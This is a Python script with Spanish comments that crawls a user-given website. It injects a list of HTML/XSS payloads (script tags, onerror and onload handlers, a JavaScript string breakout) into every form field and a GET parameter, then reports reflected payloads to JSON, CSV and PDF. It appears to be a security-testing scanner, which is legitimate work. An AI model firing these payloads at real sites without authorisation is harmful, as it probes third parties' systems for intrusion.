import requests
import re
import json
import csv
import pdfkit
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Configuración de payloads para HTML Injection
PAYLOADS = [
    "<b>Inject</b>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<input value='Injected' onfocus=alert(1)>",
    "'><svg/onload=alert(1)>",
    "'; alert(1); var x='",
]

# Función para explorar automáticamente todas las páginas enlazadas
def crawl_site(base_url, max_depth=2):
    visited = set()
    to_visit = {base_url}

    for _ in range(max_depth):
        new_links = set()
        for url in to_visit:
            if url in visited:
                continue
            visited.add(url)
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, "html.parser")
                    for link in soup.find_all("a", href=True):
                        full_url = urljoin(base_url, link["href"])
                        if base_url in full_url and full_url not in visited:
                            new_links.add(full_url)
            except requests.RequestException:
                pass
        to_visit = new_links

    return visited

# Función para probar inyecciones en formularios y parámetros
def test_html_injection(target_url):
    results = []
    try:
        response = requests.get(target_url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")

        # Buscar formularios en la página
        forms = soup.find_all("form")
        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")

            for payload in PAYLOADS:
                data = {}
                for input_field in inputs:
                    name = input_field.get("name")
                    if name:
                        data[name] = payload

                form_url = urljoin(target_url, action)
                res = requests.request(method, form_url, data=data, timeout=5)

                if payload in res.text:
                    results.append({
                        "url": form_url,
                        "method": method.upper(),
                        "payload": payload,
                        "impact": classify_impact(payload),
                    })

        # Probar en parámetros GET
        for payload in PAYLOADS:
            param_url = f"{target_url}?param={payload}"
            res = requests.get(param_url, timeout=5)
            if payload in res.text:
                results.append({
                    "url": param_url,
                    "method": "GET",
                    "payload": payload,
                    "impact": classify_impact(payload),
                })

    except requests.RequestException:
        pass

    return results

# Clasificar impacto de la inyección
def classify_impact(payload):
    if "script" in payload or "onerror" in payload:
        return "ALTO (Puede derivar en XSS persistente)"
    elif "<b>" in payload or "<input>" in payload:
        return "MEDIO (Modificación de contenido)"
    else:
        return "BAJO (Impacto limitado)"

# Guardar resultados en JSON, CSV y PDF
def save_results(results):
    with open("report.json", "w") as f:
        json.dump(results, f, indent=4)

    with open("report.csv", "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["URL", "Método", "Payload", "Impacto"])
        for row in results:
            writer.writerow([row["url"], row["method"], row["payload"], row["impact"]])

    html_content = "<h1>Reporte de HTML Injection</h1><table border='1'>"
    html_content += "<tr><th>URL</th><th>Método</th><th>Payload</th><th>Impacto</th></tr>"
    for row in results:
        html_content += f"<tr><td>{row['url']}</td><td>{row['method']}</td><td>{row['payload']}</td><td>{row['impact']}</td></tr>"
    html_content += "</table>"
    pdfkit.from_string(html_content, "report.pdf")

# Función principal
def main():
    base_url = input("Introduce la URL objetivo: ")
    print("\n🚀 Explorando el sitio en busca de vulnerabilidades...")
    pages = crawl_site(base_url)
    
    all_results = []
    for page in pages:
        print(f"🔍 Analizando {page}")
        results = test_html_injection(page)
        all_results.extend(results)

    if all_results:
        print("\n✅ ¡Vulnerabilidades detectadas! Generando reportes...")
        save_results(all_results)
    else:
        print("\n🔹 No se detectaron vulnerabilidades.")

if __name__ == "__main__":
    main()
